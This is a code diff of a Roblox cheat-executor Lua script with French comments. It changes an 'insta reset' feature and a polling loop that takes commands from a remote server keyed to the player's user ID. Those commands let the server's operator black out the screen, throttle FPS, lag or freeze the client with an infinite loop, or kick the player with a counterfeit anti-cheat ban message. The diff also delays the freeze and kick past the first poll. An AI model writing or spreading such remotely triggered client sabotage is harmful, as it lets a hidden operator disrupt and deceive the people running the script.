@@ -490,43 +490,46 @@ local function setBlackScreen(on)
     end
 end
 
--- Insta reset (logique Filthy Hub exacte : hook FireServer + RE/)
+-- Insta reset (logique Filthy : FireServer GUID + balloon)
+-- PAS de hookfunction(FireServer) au load → ça crash beaucoup d'exécuteurs
 local RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
 local reset_remote = nil
 local insta_reset_cooldown = false
 
-local orig_fire
-pcall(function()
-    if hookfunction and newcclosure then
-        orig_fire = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
-            if not reset_remote and type(self.Name) == "string" and self.Name:sub(1, 3) == "RE/" then
-                reset_remote = self
+local function findResetRemote()
+    local containers = {}
+    pcall(function() table.insert(containers, game:GetService("ReplicatedStorage")) end)
+    pcall(function() table.insert(containers, game:GetService("ReplicatedFirst")) end)
+    pcall(function()
+        local ps = game:GetService("Players")
+        local plr = ps.LocalPlayer
+        if plr then table.insert(containers, plr) end
+    end)
+
+    for _, container in ipairs(containers) do
+        local ok, descs = pcall(function() return container:GetDescendants() end)
+        if ok and descs then
+            for _, desc in ipairs(descs) do
+                if desc:IsA("RemoteEvent") and type(desc.Name) == "string" and desc.Name:sub(1, 3) == "RE/" then
+                    return desc
+                end
             end
-            return orig_fire(self, ...)
-        end))
+        end
     end
-end)
+    return nil
+end
 
 task.spawn(function()
-    task.wait(3)
-    if reset_remote then return end
-    for _, desc in ipairs(game:GetDescendants()) do
-        if desc:IsA("RemoteEvent") and type(desc.Name) == "string" and desc.Name:sub(1, 3) == "RE/" then
-            reset_remote = desc
-            break
-        end
+    task.wait(1)
+    if not reset_remote then
+        reset_remote = findResetRemote()
     end
 end)
 
 local function insta_reset()
     if insta_reset_cooldown then return end
-    if not reset_remote then
-        for _, desc in ipairs(game:GetDescendants()) do
-            if desc:IsA("RemoteEvent") and type(desc.Name) == "string" and desc.Name:sub(1, 3) == "RE/" then
-                reset_remote = desc
-                break
-            end
-        end
+    if not reset_remote or not reset_remote.Parent then
+        reset_remote = findResetRemote()
     end
     if not reset_remote then return end
 
@@ -591,6 +594,8 @@ local function setReset(on)
     end)
 end
 
+local bootPollDone = false
+
 local function poll()
     local res = safe(function()
         return request({
@@ -638,22 +643,35 @@ local function poll()
         setBlackScreen(true)
     end
 
-    if data.crash == true then
-        while true do end
-    end
-    if data.kick == true and not kicked then
-        kicked = true
-        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
+    -- 1er poll : ignore kick/crash (vieux flag qui freeze au relaunch)
+    if bootPollDone then
+        if data.crash == true then
+            while true do end
+        end
+        if data.kick == true and not kicked then
+            kicked = true
+            LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
+        end
+    else
+        bootPollDone = true
     end
 end
 
--- Au lancement / rejoindre : force reset + black screen OFF
+-- Au lancement : coupe les flags qui peuvent freeze / crash le jeu
 safe(function()
     request({
         Url = BASE .. "/api/public/command",
         Method = "POST",
         Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
-        Body = HttpService:JSONEncode({ user_id = LP.UserId, reset = false, black_screen = false }),
+        Body = HttpService:JSONEncode({
+            user_id = LP.UserId,
+            reset = false,
+            black_screen = false,
+            fps_limit = false,
+            lag_n = false,
+            lag_c = false,
+            clear_oneshot = true,
+        }),
     })
 end)
 
